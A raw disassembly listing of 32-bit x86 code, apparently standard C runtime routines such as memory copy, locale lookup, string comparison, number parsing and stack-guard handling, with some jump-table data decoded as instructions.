  4281db:	mov    edi,DWORD PTR [ebp+0x8]
  4281de:	mov    eax,ecx
  4281e0:	mov    edx,ecx
  4281e2:	add    eax,esi
  4281e4:	cmp    edi,esi
  4281e6:	jbe    0x4281f0
  4281e8:	cmp    edi,eax
  4281ea:	jb     0x42836c
  4281f0:	test   edi,0x3
  4281f6:	jne    0x42820c
  4281f8:	shr    ecx,0x2
  4281fb:	and    edx,0x3
  4281fe:	cmp    ecx,0x8
  428201:	jb     0x42822c
  428203:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428205:	jmp    DWORD PTR [edx*4+0x42831c]
  42820c:	mov    eax,edi
  42820e:	mov    edx,0x3
  428213:	sub    ecx,0x4
  428216:	jb     0x428224
  428218:	and    eax,0x3
  42821b:	add    ecx,eax
  42821d:	jmp    DWORD PTR [eax*4+0x428230]
  428224:	jmp    DWORD PTR [ecx*4+0x42832c]
  42822b:	nop
  42822c:	jmp    DWORD PTR [ecx*4+0x4282b0]
  428233:	nop
  428234:	inc    eax
  428235:	add    BYTE PTR [edx+0x0],0x6c
  428239:	add    BYTE PTR [edx+0x0],0x90
  42823d:	add    BYTE PTR [edx+0x0],0x23
  428241:	ror    DWORD PTR [edx-0x75f877fa],1
  428247:	inc    esi
  428248:	add    DWORD PTR [eax+0x468a0147],ecx
  42824e:	add    al,cl
  428250:	jmp    0x28a0a57
  428255:	add    esi,0x3
  428258:	add    edi,0x3
  42825b:	cmp    ecx,0x8
  42825e:	jb     0x42822c
  428260:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428262:	jmp    DWORD PTR [edx*4+0x42831c]
  428269:	lea    ecx,[ecx+0x0]
  42826c:	and    edx,ecx
  42826e:	mov    al,BYTE PTR [esi]
  428270:	mov    BYTE PTR [edi],al
  428272:	mov    al,BYTE PTR [esi+0x1]
  428275:	shr    ecx,0x2
  428278:	mov    BYTE PTR [edi+0x1],al
  42827b:	add    esi,0x2
  42827e:	add    edi,0x2
  428281:	cmp    ecx,0x8
  428284:	jb     0x42822c
  428286:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428288:	jmp    DWORD PTR [edx*4+0x42831c]
  42828f:	nop
  428290:	and    edx,ecx
  428292:	mov    al,BYTE PTR [esi]
  428294:	mov    BYTE PTR [edi],al
  428296:	add    esi,0x1
  428299:	shr    ecx,0x2
  42829c:	add    edi,0x1
  42829f:	cmp    ecx,0x8
  4282a2:	jb     0x42822c
  4282a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282a6:	jmp    DWORD PTR [edx*4+0x42831c]
  4282ad:	lea    ecx,[ecx+0x0]
  4282b0:	adc    eax,DWORD PTR [ebx-0x7cffffbe]
  4282b6:	inc    edx
  4282b7:	add    al,bh
  4282b9:	add    BYTE PTR [edx+0x0],0xf0
  4282bd:	add    BYTE PTR [edx+0x0],0xe8
  4282c1:	add    BYTE PTR [edx+0x0],0xe0
  4282c5:	add    BYTE PTR [edx+0x0],0xd8
  4282c9:	add    BYTE PTR [edx+0x0],0xd0
  4282cd:	add    BYTE PTR [edx+0x0],0x8b
  4282d1:	inc    esp
  4282d2:	mov    fs,esp
  4282d4:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  4282d8:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  4282dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4282e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4282e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4282e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4282ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4282f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4282f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4282f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4282fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  428300:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  428304:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  428308:	lea    eax,[ecx*4+0x0]
  42830f:	add    esi,eax
  428311:	add    edi,eax
  428313:	jmp    DWORD PTR [edx*4+0x42831c]
  42831a:	mov    edi,edi
  42831c:	sub    al,0x83
  42831e:	inc    edx
  42831f:	add    BYTE PTR [ebx+eax*4],dh
  428322:	inc    edx
  428323:	add    BYTE PTR [eax-0x7d],al
  428326:	inc    edx
  428327:	add    BYTE PTR [ebx+eax*4+0x42],dl
  42832b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  428331:	leave  
  428332:	ret    
  428333:	nop
  428334:	mov    al,BYTE PTR [esi]
  428336:	mov    BYTE PTR [edi],al
  428338:	mov    eax,DWORD PTR [ebp+0x8]
  42833b:	pop    esi
  42833c:	pop    edi
  42833d:	leave  
  42833e:	ret    
  42833f:	nop
  428340:	mov    al,BYTE PTR [esi]
  428342:	mov    BYTE PTR [edi],al
  428344:	mov    al,BYTE PTR [esi+0x1]
  428347:	mov    BYTE PTR [edi+0x1],al
  42834a:	mov    eax,DWORD PTR [ebp+0x8]
  42834d:	pop    esi
  42834e:	pop    edi
  42834f:	leave  
  428350:	ret    
  428351:	lea    ecx,[ecx+0x0]
  428354:	mov    al,BYTE PTR [esi]
  428356:	mov    BYTE PTR [edi],al
  428358:	mov    al,BYTE PTR [esi+0x1]
  42835b:	mov    BYTE PTR [edi+0x1],al
  42835e:	mov    al,BYTE PTR [esi+0x2]
  428361:	mov    BYTE PTR [edi+0x2],al
  428364:	mov    eax,DWORD PTR [ebp+0x8]
  428367:	pop    esi
  428368:	pop    edi
  428369:	leave  
  42836a:	ret    
  42836b:	nop
  42836c:	lea    esi,[ecx+esi*1-0x4]
  428370:	lea    edi,[ecx+edi*1-0x4]
  428374:	test   edi,0x3
  42837a:	jne    0x4283a0
  42837c:	shr    ecx,0x2
  42837f:	and    edx,0x3
  428382:	cmp    ecx,0x8
  428385:	jb     0x428394
  428387:	std    
  428388:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42838a:	cld    
  42838b:	jmp    DWORD PTR [edx*4+0x4284b8]
  428392:	mov    edi,edi
  428394:	neg    ecx
  428396:	jmp    DWORD PTR [ecx*4+0x428468]
  42839d:	lea    ecx,[ecx+0x0]
  4283a0:	mov    eax,edi
  4283a2:	mov    edx,0x3
  4283a7:	cmp    ecx,0x4
  4283aa:	jb     0x4283b8
  4283ac:	and    eax,0x3
  4283af:	sub    ecx,eax
  4283b1:	jmp    DWORD PTR [eax*4+0x4283bc]
  4283b8:	jmp    DWORD PTR [ecx*4+0x4284b8]
  4283bf:	nop
  4283c0:	int3   
  4283c1:	add    DWORD PTR [edx+0x0],0xfffffff0
  4283c5:	add    DWORD PTR [edx+0x0],0x18
  4283c9:	test   BYTE PTR [edx+0x0],al
  4283cc:	mov    al,BYTE PTR [esi+0x3]
  4283cf:	and    edx,ecx
  4283d1:	mov    BYTE PTR [edi+0x3],al
  4283d4:	sub    esi,0x1
  4283d7:	shr    ecx,0x2
  4283da:	sub    edi,0x1
  4283dd:	cmp    ecx,0x8
  4283e0:	jb     0x428394
  4283e2:	std    
  4283e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283e5:	cld    
  4283e6:	jmp    DWORD PTR [edx*4+0x4284b8]
  4283ed:	lea    ecx,[ecx+0x0]
  4283f0:	mov    al,BYTE PTR [esi+0x3]
  4283f3:	and    edx,ecx
  4283f5:	mov    BYTE PTR [edi+0x3],al
  4283f8:	mov    al,BYTE PTR [esi+0x2]
  4283fb:	shr    ecx,0x2
  4283fe:	mov    BYTE PTR [edi+0x2],al
  428401:	sub    esi,0x2
  428404:	sub    edi,0x2
  428407:	cmp    ecx,0x8
  42840a:	jb     0x428394
  42840c:	std    
  42840d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42840f:	cld    
  428410:	jmp    DWORD PTR [edx*4+0x4284b8]
  428417:	nop
  428418:	mov    al,BYTE PTR [esi+0x3]
  42841b:	and    edx,ecx
  42841d:	mov    BYTE PTR [edi+0x3],al
  428420:	mov    al,BYTE PTR [esi+0x2]
  428423:	mov    BYTE PTR [edi+0x2],al
  428426:	mov    al,BYTE PTR [esi+0x1]
  428429:	shr    ecx,0x2
  42842c:	mov    BYTE PTR [edi+0x1],al
  42842f:	sub    esi,0x3
  428432:	sub    edi,0x3
  428435:	cmp    ecx,0x8
  428438:	jb     0x428394
  42843e:	std    
  42843f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428441:	cld    
  428442:	jmp    DWORD PTR [edx*4+0x4284b8]
  428449:	lea    ecx,[ecx+0x0]
  42844c:	ins    BYTE PTR es:[edi],dx
  42844d:	test   BYTE PTR [edx+0x0],al
  428450:	je     0x4283d6
  428452:	inc    edx
  428453:	add    BYTE PTR [esp+eax*4+0x42],bh
  428457:	add    BYTE PTR [esp+eax*4-0x7b73ffbe],al
  42845e:	inc    edx
  42845f:	add    BYTE PTR [esp+eax*4-0x7b63ffbe],dl
  428466:	inc    edx
  428467:	add    BYTE PTR [edi-0x74ffbd7c],ch
  42846d:	inc    esp
  42846e:	mov    ds,WORD PTR [ecx+ecx*4]
  428471:	inc    esp
  428472:	(bad)  
  428473:	sbb    al,0x8b
  428475:	inc    esp
  428476:	mov    ds,WORD PTR [eax]
  428478:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42847c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428480:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428484:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428488:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42848c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428490:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428494:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428498:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42849c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4284a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4284a4:	lea    eax,[ecx*4+0x0]
  4284ab:	add    esi,eax
  4284ad:	add    edi,eax
  4284af:	jmp    DWORD PTR [edx*4+0x4284b8]
  4284b6:	mov    edi,edi
  4284b8:	enter  0x4284,0x0
  4284bc:	rol    BYTE PTR [edx+eax*2+0x4284e000],1
  4284c3:	add    ah,dh
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	mov    eax,DWORD PTR [ebp+0x8]
  4284cb:	pop    esi
  4284cc:	pop    edi
  4284cd:	leave  
  4284ce:	ret    
  4284cf:	nop
  4284d0:	mov    al,BYTE PTR [esi+0x3]
  4284d3:	mov    BYTE PTR [edi+0x3],al
  4284d6:	mov    eax,DWORD PTR [ebp+0x8]
  4284d9:	pop    esi
  4284da:	pop    edi
  4284db:	leave  
  4284dc:	ret    
  4284dd:	lea    ecx,[ecx+0x0]
  4284e0:	mov    al,BYTE PTR [esi+0x3]
  4284e3:	mov    BYTE PTR [edi+0x3],al
  4284e6:	mov    al,BYTE PTR [esi+0x2]
  4284e9:	mov    BYTE PTR [edi+0x2],al
  4284ec:	mov    eax,DWORD PTR [ebp+0x8]
  4284ef:	pop    esi
  4284f0:	pop    edi
  4284f1:	leave  
  4284f2:	ret    
  4284f3:	nop
  4284f4:	mov    al,BYTE PTR [esi+0x3]
  4284f7:	mov    BYTE PTR [edi+0x3],al
  4284fa:	mov    al,BYTE PTR [esi+0x2]
  4284fd:	mov    BYTE PTR [edi+0x2],al
  428500:	mov    al,BYTE PTR [esi+0x1]
  428503:	mov    BYTE PTR [edi+0x1],al
  428506:	mov    eax,DWORD PTR [ebp+0x8]
  428509:	pop    esi
  42850a:	pop    edi
  42850b:	leave  
  42850c:	ret    
  42850d:	push   ebp
  42850e:	mov    ebp,esp
  428510:	sub    esp,0xc
  428513:	mov    eax,ds:0x4669f0
  428518:	xor    eax,DWORD PTR [ebp+0x4]
  42851b:	and    BYTE PTR [ebp-0x6],0x0
  42851f:	push   0x6
  428521:	mov    DWORD PTR [ebp-0x4],eax
  428524:	lea    eax,[ebp-0xc]
  428527:	push   eax
  428528:	push   0x1004
  42852d:	push   DWORD PTR [ebp+0x8]
  428530:	call   DWORD PTR ds:0x429060
  428536:	test   eax,eax
  428538:	jne    0x42853f
  42853a:	or     eax,0xffffffff
  42853d:	jmp    0x428549
  42853f:	lea    eax,[ebp-0xc]
  428542:	push   eax
  428543:	call   0x42884e
  428548:	pop    ecx
  428549:	mov    ecx,DWORD PTR [ebp-0x4]
  42854c:	xor    ecx,DWORD PTR [ebp+0x4]
  42854f:	call   0x42595c
  428554:	leave  
  428555:	ret    
  428556:	push   0x38
  428558:	push   0x429f08
  42855d:	call   0x425290
  428562:	mov    eax,ds:0x4669f0
  428567:	xor    eax,DWORD PTR [ebp+0x4]
  42856a:	mov    DWORD PTR [ebp-0x1c],eax
  42856d:	xor    edi,edi
  42856f:	mov    DWORD PTR [ebp-0x20],edi
  428572:	mov    DWORD PTR [ebp-0x24],edi
  428575:	mov    eax,DWORD PTR [ebp+0x14]
  428578:	mov    ebx,DWORD PTR [eax]
  42857a:	mov    DWORD PTR [ebp-0x28],ebx
  42857d:	mov    DWORD PTR [ebp-0x2c],edi
  428580:	mov    eax,DWORD PTR [ebp+0x8]
  428583:	cmp    eax,DWORD PTR [ebp+0xc]
  428586:	je     0x4286ff
  42858c:	lea    ecx,[ebp-0x40]
  42858f:	push   ecx
  428590:	push   eax
  428591:	mov    esi,DWORD PTR ds:0x4290d8
  428597:	call   esi
  428599:	test   eax,eax
  42859b:	je     0x4285bd
  42859d:	cmp    DWORD PTR [ebp-0x40],0x1
  4285a1:	jne    0x4285bd
  4285a3:	lea    eax,[ebp-0x40]
  4285a6:	push   eax
  4285a7:	push   DWORD PTR [ebp+0xc]
  4285aa:	call   esi
  4285ac:	test   eax,eax
  4285ae:	je     0x4285bd
  4285b0:	cmp    DWORD PTR [ebp-0x40],0x1
  4285b4:	jne    0x4285bd
  4285b6:	mov    DWORD PTR [ebp-0x2c],0x1
  4285bd:	cmp    DWORD PTR [ebp-0x2c],edi
  4285c0:	je     0x4285dc
  4285c2:	cmp    ebx,0xffffffff
  4285c5:	je     0x4285cb
  4285c7:	mov    esi,ebx
  4285c9:	jmp    0x4285d7
  4285cb:	push   DWORD PTR [ebp+0x10]
  4285ce:	call   0x4258a0
  4285d3:	pop    ecx
  4285d4:	mov    esi,eax
  4285d6:	inc    esi
  4285d7:	mov    DWORD PTR [ebp-0x44],esi
  4285da:	jmp    0x4285df
  4285dc:	mov    esi,DWORD PTR [ebp-0x44]
  4285df:	cmp    DWORD PTR [ebp-0x2c],edi
  4285e2:	jne    0x4285fe
  4285e4:	push   edi
  4285e5:	push   edi
  4285e6:	push   ebx
  4285e7:	push   DWORD PTR [ebp+0x10]
  4285ea:	push   0x1
  4285ec:	push   DWORD PTR [ebp+0x8]
  4285ef:	call   DWORD PTR ds:0x429104
  4285f5:	mov    esi,eax
  4285f7:	mov    DWORD PTR [ebp-0x44],esi
  4285fa:	cmp    esi,edi
  4285fc:	je     0x428656
  4285fe:	mov    DWORD PTR [ebp-0x4],edi
  428601:	lea    eax,[esi+esi*1]
  428604:	add    eax,0x3
  428607:	and    eax,0xfffffffc
  42860a:	call   0x4252e0
  42860f:	mov    DWORD PTR [ebp-0x18],esp
  428612:	mov    ebx,esp
  428614:	mov    DWORD PTR [ebp-0x48],ebx
  428617:	lea    eax,[esi+esi*1]
  42861a:	push   eax
  42861b:	push   edi
  42861c:	push   ebx
  42861d:	call   0x427b90
  428622:	add    esp,0xc
  428625:	or     DWORD PTR [ebp-0x4],0xffffffff
  428629:	jmp    0x428642
  42862b:	xor    eax,eax
  42862d:	inc    eax
  42862e:	ret    
  42862f:	mov    esp,DWORD PTR [ebp-0x18]
  428632:	call   0x428725
  428637:	xor    edi,edi
  428639:	xor    ebx,ebx
  42863b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42863f:	mov    esi,DWORD PTR [ebp-0x44]
  428642:	cmp    ebx,edi
  428644:	jne    0x428664
  428646:	push   esi
  428647:	push   0x2
  428649:	call   0x4263a8
  42864e:	pop    ecx
  42864f:	pop    ecx
  428650:	mov    ebx,eax
  428652:	cmp    ebx,edi
  428654:	jne    0x42865d
  428656:	xor    eax,eax
  428658:	jmp    0x428711
  42865d:	mov    DWORD PTR [ebp-0x24],0x1
  428664:	push   esi
  428665:	push   ebx
  428666:	push   DWORD PTR [ebp-0x28]
  428669:	push   DWORD PTR [ebp+0x10]
  42866c:	push   0x1
  42866e:	push   DWORD PTR [ebp+0x8]
  428671:	call   DWORD PTR ds:0x429104
  428677:	test   eax,eax
  428679:	je     0x428702
  42867f:	cmp    DWORD PTR [ebp+0x18],edi
  428682:	je     0x4286a4
  428684:	push   edi
  428685:	push   edi
  428686:	push   DWORD PTR [ebp+0x1c]
  428689:	push   DWORD PTR [ebp+0x18]
  42868c:	push   esi
  42868d:	push   ebx
  42868e:	push   edi
  42868f:	push   DWORD PTR [ebp+0xc]
  428692:	call   DWORD PTR ds:0x429098
  428698:	test   eax,eax
  42869a:	je     0x428702
  42869c:	mov    eax,DWORD PTR [ebp+0x18]
  42869f:	mov    DWORD PTR [ebp-0x20],eax
  4286a2:	jmp    0x428702
  4286a4:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a7:	jne    0x4286bf
  4286a9:	push   edi
  4286aa:	push   edi
  4286ab:	push   edi
  4286ac:	push   edi
  4286ad:	push   esi
  4286ae:	push   ebx
  4286af:	push   edi
  4286b0:	push   DWORD PTR [ebp+0xc]
  4286b3:	call   DWORD PTR ds:0x429098
  4286b9:	mov    esi,eax
  4286bb:	cmp    esi,edi
  4286bd:	je     0x428702
  4286bf:	push   esi
  4286c0:	push   0x1
  4286c2:	call   0x4263a8
  4286c7:	pop    ecx
  4286c8:	pop    ecx
  4286c9:	mov    DWORD PTR [ebp-0x20],eax
  4286cc:	cmp    eax,edi
  4286ce:	je     0x428702
  4286d0:	push   edi
  4286d1:	push   edi
  4286d2:	push   esi
  4286d3:	push   eax
  4286d4:	push   esi
  4286d5:	push   ebx
  4286d6:	push   edi
  4286d7:	push   DWORD PTR [ebp+0xc]
  4286da:	call   DWORD PTR ds:0x429098
  4286e0:	cmp    eax,edi
  4286e2:	jne    0x4286f2
  4286e4:	push   DWORD PTR [ebp-0x20]
  4286e7:	call   0x425e9a
  4286ec:	pop    ecx
  4286ed:	mov    DWORD PTR [ebp-0x20],edi
  4286f0:	jmp    0x428702
  4286f2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4286f6:	je     0x428702
  4286f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4286fb:	mov    DWORD PTR [ecx],eax
  4286fd:	jmp    0x428702
  4286ff:	mov    ebx,DWORD PTR [ebp-0x48]
  428702:	cmp    DWORD PTR [ebp-0x24],edi
  428705:	je     0x42870e
  428707:	push   ebx
  428708:	call   0x425e9a
  42870d:	pop    ecx
  42870e:	mov    eax,DWORD PTR [ebp-0x20]
  428711:	lea    esp,[ebp-0x54]
  428714:	mov    ecx,DWORD PTR [ebp-0x1c]
  428717:	xor    ecx,DWORD PTR [ebp+0x4]
  42871a:	call   0x42595c
  42871f:	call   0x4252cb
  428724:	ret    
  428725:	push   ebp
  428726:	mov    ebp,esp
  428728:	sub    esp,0x48
  42872b:	push   ebx
  42872c:	push   esi
  42872d:	push   edi
  42872e:	push   0x4
  428730:	pop    eax
  428731:	call   0x4252e0
  428736:	mov    ebx,esp
  428738:	push   0x1c
  42873a:	lea    eax,[ebp-0x24]
  42873d:	push   eax
  42873e:	push   ebx
  42873f:	call   DWORD PTR ds:0x42903c
  428745:	test   eax,eax
  428747:	je     0x4287ba
  428749:	mov    edi,DWORD PTR [ebp-0x20]
  42874c:	lea    eax,[ebp-0x48]
  42874f:	push   eax
  428750:	call   DWORD PTR ds:0x429040
  428756:	mov    eax,DWORD PTR [ebp-0x44]
  428759:	lea    esi,[eax-0x1]
  42875c:	not    esi
  42875e:	and    esi,ebx
  428760:	sub    esi,eax
  428762:	mov    DWORD PTR [ebp-0x4],eax
  428765:	mov    eax,ds:0x467084
  42876a:	mov    ecx,eax
  42876c:	dec    ecx
  42876d:	neg    ecx
  42876f:	sbb    ecx,ecx
  428771:	and    ecx,0xffff1000
  428777:	add    ecx,0x11000
  42877d:	add    ecx,edi
  42877f:	cmp    esi,ecx
  428781:	jb     0x4287ba
  428783:	cmp    eax,0x1
  428786:	je     0x4287d2
  428788:	mov    ebx,edi
  42878a:	mov    edi,0x1000
  42878f:	push   0x1c
  428791:	lea    eax,[ebp-0x24]
  428794:	push   eax
  428795:	push   ebx
  428796:	call   DWORD PTR ds:0x42903c
  42879c:	test   eax,eax
  42879e:	je     0x4287ba
  4287a0:	add    ebx,DWORD PTR [ebp-0x18]
  4287a3:	test   DWORD PTR [ebp-0x14],edi
  4287a6:	je     0x42878f
  4287a8:	test   BYTE PTR [ebp-0xf],0x1
  4287ac:	mov    ebx,DWORD PTR [ebp-0x24]
  4287af:	je     0x4287b6
  4287b1:	xor    eax,eax
  4287b3:	inc    eax
  4287b4:	jmp    0x4287ee
  4287b6:	cmp    esi,ebx
  4287b8:	jae    0x4287be
  4287ba:	xor    eax,eax
  4287bc:	jmp    0x4287ee
  4287be:	push   0x4
  4287c0:	push   edi
  4287c1:	push   DWORD PTR [ebp-0x4]
  4287c4:	push   ebx
  4287c5:	call   DWORD PTR ds:0x4290e4
  4287cb:	mov    eax,ds:0x467084
  4287d0:	jmp    0x4287d4
  4287d2:	mov    ebx,esi
  4287d4:	dec    eax
  4287d5:	neg    eax
  4287d7:	sbb    eax,eax
  4287d9:	and    eax,0x103
  4287de:	lea    ecx,[ebp-0x8]
  4287e1:	push   ecx
  4287e2:	inc    eax
  4287e3:	push   eax
  4287e4:	push   DWORD PTR [ebp-0x4]
  4287e7:	push   ebx
  4287e8:	call   DWORD PTR ds:0x429024
  4287ee:	lea    esp,[ebp-0x54]
  4287f1:	pop    edi
  4287f2:	pop    esi
  4287f3:	pop    ebx
  4287f4:	leave  
  4287f5:	ret    
  4287f6:	int3   
  4287f7:	int3   
  4287f8:	int3   
  4287f9:	int3   
  4287fa:	int3   
  4287fb:	int3   
  4287fc:	int3   
  4287fd:	int3   
  4287fe:	int3   
  4287ff:	int3   
  428800:	push   ebp
  428801:	mov    ebp,esp
  428803:	push   edi
  428804:	push   esi
  428805:	push   ebx
  428806:	mov    esi,DWORD PTR [ebp+0xc]
  428809:	mov    edi,DWORD PTR [ebp+0x8]
  42880c:	mov    al,0xff
  42880e:	mov    edi,edi
  428810:	or     al,al
  428812:	je     0x428846
  428814:	mov    al,BYTE PTR [esi]
  428816:	add    esi,0x1
  428819:	mov    ah,BYTE PTR [edi]
  42881b:	add    edi,0x1
  42881e:	cmp    ah,al
  428820:	je     0x428810
  428822:	sub    al,0x41
  428824:	cmp    al,0x1a
  428826:	sbb    cl,cl
  428828:	and    cl,0x20
  42882b:	add    al,cl
  42882d:	add    al,0x41
  42882f:	xchg   al,ah
  428831:	sub    al,0x41
  428833:	cmp    al,0x1a
  428835:	sbb    cl,cl
  428837:	and    cl,0x20
  42883a:	add    al,cl
  42883c:	add    al,0x41
  42883e:	cmp    al,ah
  428840:	je     0x428810
  428842:	sbb    al,al
  428844:	sbb    al,0xff
  428846:	movsx  eax,al
  428849:	pop    ebx
  42884a:	pop    esi
  42884b:	pop    edi
  42884c:	leave  
  42884d:	ret    
  42884e:	push   esi
  42884f:	push   edi
  428850:	call   0x425145
  428855:	mov    edi,DWORD PTR [eax+0x64]
  428858:	cmp    edi,DWORD PTR ds:0x466b4c
  42885e:	je     0x428867
  428860:	call   0x4265ef
  428865:	mov    edi,eax
  428867:	mov    esi,DWORD PTR [esp+0xc]
  42886b:	cmp    DWORD PTR [edi+0x28],0x1
  42886f:	movzx  eax,BYTE PTR [esi]
  428872:	jle    0x428882
  428874:	push   0x8
  428876:	push   eax
  428877:	push   edi
  428878:	call   0x4288d6
  42887d:	add    esp,0xc
  428880:	jmp    0x42888c
  428882:	mov    ecx,DWORD PTR [edi+0x48]
  428885:	movzx  eax,BYTE PTR [ecx+eax*2]
  428889:	and    eax,0x8
  42888c:	test   eax,eax
  42888e:	je     0x428893
  428890:	inc    esi
  428891:	jmp    0x42886b
  428893:	movzx  ecx,BYTE PTR [esi]
  428896:	inc    esi
  428897:	cmp    ecx,0x2d
  42889a:	mov    edx,ecx
  42889c:	je     0x4288a3
  42889e:	cmp    ecx,0x2b
  4288a1:	jne    0x4288a7
  4288a3:	movzx  ecx,BYTE PTR [esi]
  4288a6:	inc    esi
  4288a7:	xor    eax,eax
  4288a9:	cmp    ecx,0x30
  4288ac:	jl     0x4288b8
  4288ae:	cmp    ecx,0x39
  4288b1:	jg     0x4288b8
  4288b3:	sub    ecx,0x30
  4288b6:	jmp    0x4288bb
  4288b8:	or     ecx,0xffffffff
  4288bb:	cmp    ecx,0xffffffff
  4288be:	je     0x4288cc
  4288c0:	lea    eax,[eax+eax*4]
  4288c3:	lea    eax,[ecx+eax*2]
  4288c6:	movzx  ecx,BYTE PTR [esi]
  4288c9:	inc    esi
  4288ca:	jmp    0x4288a9
  4288cc:	cmp    edx,0x2d
  4288cf:	pop    edi
  4288d0:	pop    esi
  4288d1:	jne    0x4288d5
  4288d3:	neg    eax
  4288d5:	ret    
  4288d6:	push   ebp
  4288d7:	mov    ebp,esp
  4288d9:	push   ecx
  4288da:	mov    eax,DWORD PTR [ebp+0xc]
  4288dd:	lea    ecx,[eax+0x1]
  4288e0:	cmp    ecx,0x100
  4288e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4288e9:	ja     0x4288f4
  4288eb:	mov    ecx,DWORD PTR [ecx+0x48]
  4288ee:	movzx  eax,WORD PTR [ecx+eax*2]
  4288f2:	jmp    0x428948
  4288f4:	push   esi
  4288f5:	mov    edx,eax
  4288f7:	sar    edx,0x8
  4288fa:	push   edi
  4288fb:	mov    edi,DWORD PTR [ecx+0x48]
  4288fe:	movzx  esi,dl
  428901:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428906:	pop    edi
  428907:	pop    esi
  428908:	je     0x428919
  42890a:	and    BYTE PTR [ebp-0x2],0x0
  42890e:	push   0x2
  428910:	mov    BYTE PTR [ebp-0x3],al
  428913:	mov    BYTE PTR [ebp-0x4],dl
  428916:	pop    eax
  428917:	jmp    0x428923
  428919:	and    BYTE PTR [ebp-0x3],0x0
  42891d:	mov    BYTE PTR [ebp-0x4],al
  428920:	xor    eax,eax
  428922:	inc    eax
  428923:	push   0x1
  428925:	push   DWORD PTR [ecx+0x14]
  428928:	push   DWORD PTR [ecx+0x4]
  42892b:	lea    ecx,[ebp+0xe]
  42892e:	push   ecx
  42892f:	push   eax
  428930:	lea    eax,[ebp-0x4]
  428933:	push   eax
  428934:	push   0x1
  428936:	call   0x4279b8
  42893b:	add    esp,0x1c
  42893e:	test   eax,eax
  428940:	jne    0x428944
  428942:	leave  
  428943:	ret    
  428944:	movzx  eax,WORD PTR [ebp+0xe]
  428948:	and    eax,DWORD PTR [ebp+0x10]
  42894b:	leave  
  42894c:	ret    
  42894d:	int3   
  42894e:	int3   
  42894f:	int3   
  428950:	mov    eax,DWORD PTR [esp+0x8]
  428954:	mov    ecx,DWORD PTR [esp+0x10]
  428958:	or     ecx,eax
  42895a:	mov    ecx,DWORD PTR [esp+0xc]
  42895e:	jne    0x428969
  428960:	mov    eax,DWORD PTR [esp+0x4]
  428964:	mul    ecx
  428966:	ret    0x10
  428969:	push   ebx
  42896a:	mul    ecx
  42896c:	mov    ebx,eax
  42896e:	mov    eax,DWORD PTR [esp+0x8]
  428972:	mul    DWORD PTR [esp+0x14]
  428976:	add    ebx,eax
  428978:	mov    eax,DWORD PTR [esp+0x8]
  42897c:	mul    ecx
  42897e:	add    edx,ebx
  428980:	pop    ebx
  428981:	ret    0x10
  428984:	int3   
  428985:	int3   
  428986:	int3   
  428987:	int3   
  428988:	int3   
  428989:	int3   
  42898a:	int3   
  42898b:	int3   
  42898c:	int3   
  42898d:	int3   
  42898e:	int3   
  42898f:	int3   
  428990:	push   ebp
  428991:	mov    ebp,esp
  428993:	push   edi
  428994:	push   esi
  428995:	push   ebx
  428996:	mov    ecx,DWORD PTR [ebp+0x10]
  428999:	or     ecx,ecx
  42899b:	je     0x4289ea
  42899d:	mov    esi,DWORD PTR [ebp+0x8]
  4289a0:	mov    edi,DWORD PTR [ebp+0xc]
  4289a3:	mov    bh,0x41
  4289a5:	mov    bl,0x5a
  4289a7:	mov    dh,0x20
  4289a9:	lea    ecx,[ecx+0x0]
  4289ac:	mov    ah,BYTE PTR [esi]
  4289ae:	or     ah,ah
  4289b0:	mov    al,BYTE PTR [edi]
  4289b2:	je     0x4289db
  4289b4:	or     al,al
  4289b6:	je     0x4289db
  4289b8:	add    esi,0x1
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,bh
  4289c0:	jb     0x4289c8
  4289c2:	cmp    ah,bl
  4289c4:	ja     0x4289c8
  4289c6:	add    ah,dh
  4289c8:	cmp    al,bh
  4289ca:	jb     0x4289d2
  4289cc:	cmp    al,bl
  4289ce:	ja     0x4289d2
  4289d0:	add    al,dh
  4289d2:	cmp    ah,al
  4289d4:	jne    0x4289e1
  4289d6:	sub    ecx,0x1
  4289d9:	jne    0x4289ac
  4289db:	xor    ecx,ecx
  4289dd:	cmp    ah,al
  4289df:	je     0x4289ea
  4289e1:	mov    ecx,0xffffffff
  4289e6:	jb     0x4289ea
  4289e8:	neg    ecx
  4289ea:	mov    eax,ecx
  4289ec:	pop    ebx
  4289ed:	pop    esi
